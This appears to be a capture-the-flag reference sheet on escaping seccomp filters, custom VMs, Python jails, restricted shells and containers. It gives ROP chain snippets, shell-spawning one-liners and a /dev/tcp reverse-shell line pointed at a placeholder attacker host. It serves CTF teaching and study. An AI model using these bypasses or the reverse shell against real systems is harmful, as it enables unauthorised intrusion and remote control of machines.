# Sandbox and Seccomp Bypass

## Seccomp Filter Analysis

```bash
seccomp-tools dump ./binary      # dump and disassemble filter
```

```python
# Common seccomp filter patterns:
# - Whitelist: only allow specific syscalls
# - Blacklist: block specific syscalls (easier to bypass)
# - Architecture check: blocks 32-bit syscalls (or doesn't)
```

## Seccomp Bypass Strategies

### ORW (Open-Read-Write)

**When**: `execve` is blocked but `open`/`read`/`write` allowed.

```python
# ROP chain for ORW
rop = ROP(elf)
# open("flag.txt", O_RDONLY)
rop.call('open', [flag_str, 0])
# read(fd=3, buf, 0x100) — fd is 3 (after stdin/stdout/stderr)
rop.call('read', [3, buf_addr, 0x100])
# write(1, buf, 0x100)
rop.call('write', [1, buf_addr, 0x100])
```

### openat / openat2

**When**: `open` is blocked but `openat` or `openat2` isn't.

```python
# openat(AT_FDCWD, "flag.txt", O_RDONLY)
# AT_FDCWD = -100
rop.raw(pop_rdi); rop.raw(-100 & 0xffffffffffffffff)
rop.raw(pop_rsi); rop.raw(flag_str)
rop.raw(pop_rdx); rop.raw(0)
rop.raw(pop_rax); rop.raw(257)  # openat
rop.raw(syscall_ret)
```

### sendfile

**When**: `write` is blocked but `sendfile` isn't.

```python
# sendfile(stdout, flag_fd, NULL, size)
# Avoids needing a buffer
```

### Architecture Switch (RETF)

**When**: Seccomp only checks x86-64 syscall numbers.

32-bit syscalls via `int 0x80` use different numbers:
- `open` = 5, `read` = 3, `write` = 4, `execve` = 11

```python
# Switch to 32-bit mode via retf (see rop-advanced.md)
# Then use int 0x80 with 32-bit syscall numbers
```

### Conditional Seccomp

**When**: Seccomp filter checks specific argument values
(e.g., blocks `write` only to fd=1).

**How**: Use `dup2` to duplicate fd, or use `writev`, `pwritev`,
`sendmsg`, or other variants not covered by the filter.

## VM / Interpreter Exploitation

**When**: Challenge implements a custom VM or bytecode interpreter.

### Common VM Vulnerabilities

- **Out-of-bounds memory access**: VM doesn't bounds-check array indices.
- **Type confusion**: VM allows operations on wrong types.
- **Stack underflow/overflow**: VM stack operations unchecked.
- **Arbitrary code generation**: JIT compiler generates writable+executable memory.

### JIT Exploitation

**When**: A JIT compiler exists (custom or JavaScript engine).

**How**: Craft input that causes the JIT to emit shellcode-like
machine code at a known (or leaked) address. Then redirect
execution to the JIT output.

## Python Sandbox Escape

**When**: Challenge provides a restricted Python interpreter.
(See also `misc-ctf/references/pyjail-escapes.md` for detailed
bypass techniques.)

Key approaches:
- Subclass chain: `''.__class__.__mro__[1].__subclasses__()`
- `__import__` bypass via `importlib` or builtins
- `__code__` object manipulation
- `breakpoint()` (Python 3.7+) drops to `pdb`

## Shell Escape

**When**: Restricted shell (rbash, limited PATH, command filter).
(See `misc-ctf/references/bashjail-escapes.md` for details.)

Quick escapes:
```bash
# From rbash:
vi -c ':!/bin/sh'
awk 'BEGIN{system("/bin/sh")}'
python3 -c 'import os; os.system("/bin/sh")'

# File descriptor tricks:
exec 3<>/dev/tcp/attacker/port; /bin/sh <&3 >&3 2>&3
```

## FUSE/CUSE Backdoor

**When**: FUSE (Filesystem in Userspace) is available.

**How**: Create a FUSE filesystem that returns crafted data when
the target process reads from it. Useful for bypassing input
validation that reads from a file.

## Container Escape

Relevant in Docker/container-based CTF challenges:

- **Privileged container**: mount host filesystem
- **Docker socket exposed**: create new privileged container
- **Kernel exploit**: escape via kernel vulnerability
- **CAP_SYS_ADMIN**: `mount -t overlay` or `nsenter`
- **procfs/sysfs access**: write to host via `/proc/sysrq-trigger`
